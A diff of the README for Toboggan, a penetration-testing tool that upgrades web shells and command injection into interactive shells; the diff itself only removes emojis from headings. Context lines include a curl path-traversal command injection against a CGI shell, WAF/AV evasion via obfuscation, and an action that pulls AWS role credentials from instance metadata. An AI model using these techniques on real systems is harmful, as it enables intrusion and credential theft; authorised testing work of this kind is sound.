@@ -12,7 +12,7 @@ The built-in forward shell in Linux uses named pipes (`mkfifo`) to provide stdin
 
 See the source-linked [Development Guide](DEVELOPMENT.md) for the architecture and execution internals.
 
-## 📦 Installation
+## Installation
 
 Prefer using [`uv`](https://docs.astral.sh/uv/), a fast Python package manager that installs tools in isolated environments. Alternatively, [`pipx`](https://pypa.github.io/pipx/) or `pip` work as well.
 
@@ -73,7 +73,7 @@ pipx inject toboggan pyrfc==3.3.1
 pip install 'git+https://github.com/n3rada/toboggan.git'
 ```
 
-## 🔍 RCE Module Interface
+## RCE Module Interface
 
 This is the primary way to use Toboggan. A module is a plain Python script that encapsulates how a command reaches the target: the HTTP request, the authentication flow, the protocol quirks, and the output extraction. Toboggan calls your `execute()` function for every command and drives the entire session from what it returns.
 
@@ -128,7 +128,7 @@ def execute(command: str, timeout: float) -> str:
 
 This pattern covers multi-stage SSRF chains, or any custom protocol that exposes command execution. As long as `execute()` returns the command output as a string, Toboggan handles the rest.
 
-### 💡 Considerations
+### Considerations
 
 Your `execute()` function owns the full translation between Toboggan's command string and the target:
 
@@ -137,11 +137,11 @@ Your `execute()` function owns the full translation between Toboggan's command s
 - Strip noise from the response (banners, prompts, HTML wrappers) before returning
 - Tune the timeout to the target's latency; Toboggan adapts internally but your function sets the floor
 
-## 🔌 Built-in Execution Backends
+## Built-in Execution Backends
 
 When writing a module is not practical, Toboggan ships two built-in backends that cover common cases directly from the command line.
 
-### 📄 Burp Suite Request
+### Burp Suite Request
 
 Import a request saved from Burp Suite and place `||cmd||` where the command should be injected (URL, headers, or body):
 
@@ -152,7 +152,7 @@ toboggan --request burp_request.xml
 > [!TIP]
 > In Burp Suite, right-click a request → **Save item**, then add `||cmd||` where the command should be injected.
 
-### 🧰 Shell Command Wrapper
+### Shell Command Wrapper
 
 Wrap any shell command that contains a command injection point using the `||cmd||` placeholder:
 
@@ -160,7 +160,7 @@ Wrap any shell command that contains a command injection point using the `||cmd|
 toboggan --exec-wrapper 'curl -s --path-as-is -d "echo Content-Type: text/plain; echo; ||cmd||" "http://192.168.216.188/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"'
 ```
 
-## 🧸 Usage
+## Usage
 
 ```shell
 toboggan <module> [options]
@@ -173,7 +173,7 @@ Upgrade your web shell or command injection to an interactive shell:
 toboggan ~/phpexploit.py
 ```
 
-### 🌐 Proxy
+### Proxy
 
 Forward traffic through any HTTP(S) proxy:
 
@@ -186,7 +186,7 @@ Route through [Burp Suite](https://portswigger.net/burp) (defaults to `http://12
 toboggan ~/phpexploit.py --proxy
 ```
 
-### 🔐 Obfuscation
+### Obfuscation
 
 `--obfuscate` (`-O`) wraps each command in a shell-level transformation (using the `obfuscate`/`deobfuscate` actions) before it reaches the target. This is useful against WAF or AV filters that inspect the command string:
 
@@ -204,7 +204,7 @@ Both flags can be combined. When active together, commands are obfuscated first 
 
 Both layers can also be toggled at runtime with `!obfuscate` and `!b64` inside the REPL.
 
-## 🏗️ Forward Shell (Named Pipes)
+## Forward Shell (Named Pipes)
 
 Toboggan upgrades dumb web shells into semi-interactive shells using named pipes (FIFO) for inter-process communication. This forward shell technique is invaluable when:
 
@@ -228,7 +228,7 @@ toboggan ~/phpexploit.py --obfuscate --fifo --os "linux"
 > [!WARNING]
 > Ctrl+C is not forwarded. Control characters only work in real TTY/PTY environments.
 
-### ⚙️ Named Pipe Options
+### Named Pipe Options
 
 | Flag | Description |
 |---|---|
@@ -238,7 +238,7 @@ toboggan ~/phpexploit.py --obfuscate --fifo --os "linux"
 | `-o`, `--stdout` | Custom output path for the FIFO pipe |
 | `--shell` | Shell binary for named pipe execution (e.g., `/bin/bash`) |
 
-## 🛠️ Built-in Actions
+## Built-in Actions
 
 Actions are modular plugins executed via the `!` prefix inside the terminal session. Use `!help` to list all available actions.
 
@@ -253,7 +253,7 @@ For example, `!imds` browses the AWS EC2 instance metadata service from the targ
 !imds --creds --profile    # same, as an ~/.aws/credentials block named after the role
 ```
 
-### 🧩 Bring Your Own Actions (BYOA)
+### Bring Your Own Actions (BYOA)
 
 Custom actions can be placed in the user action directory. Toboggan loads user actions with priority over built-in ones, allowing you to override or extend functionality.
 
@@ -273,7 +273,7 @@ actions/
 
 Your action class must inherit from `BaseAction` and implement the `run()` method. See [DEVELOPMENT.md](DEVELOPMENT.md) for the full guide on creating actions.
 
-## 📂 Data Storage
+## Data Storage
 
 Toboggan follows [XDG Base Directory](https://specifications.freedesktop.org/basedir-spec/latest/) conventions on Linux:
 
@@ -293,7 +293,7 @@ Console logs go to stderr, so stdout carries only remote command output. The log
 jq -r 'select(.level == "ERROR") | "\(.ts) \(.msg)"' ~/.local/state/toboggan/logs/toboggan.jsonl
 ```
 
-## ❓ Help
+## Help
 
 ```shell
 toboggan --help              # Show all CLI options
@@ -301,7 +301,7 @@ toboggan ~/exploit.py        # Then type !help for available actions
 toboggan ~/exploit.py        # Then type !<action> -h for action-specific help
 ```
 
-### 🔧 Terminal Built-in Commands
+### Terminal Built-in Commands
 
 | Command | Description |
 |---|---|
@@ -316,7 +316,7 @@ toboggan ~/exploit.py        # Then type !<action> -h for action-specific help
 | `!obfuscate` | Toggle command obfuscation on/off |
 | `!b64` | Toggle base64 wrapping of commands before `execute()` |
 
-## ⚠️ Disclaimer
+## Disclaimer
 
 Toboggan is intended for use in legal penetration testing, Capture The Flag (CTF) competitions, or other authorized and ethical security assessments.
 
@@ -327,7 +327,7 @@ Acceptable environments include:
 
 Misuse of this project may result in legal action.
 
-## ⚖️ Legal Notice
+## Legal Notice
 
 Any unauthorized use of this tool in real-world environments or against systems without explicit permission from the system owner is strictly prohibited and may violate legal and ethical standards. The creators and contributors of this tool are not responsible for any misuse or damage caused.
 
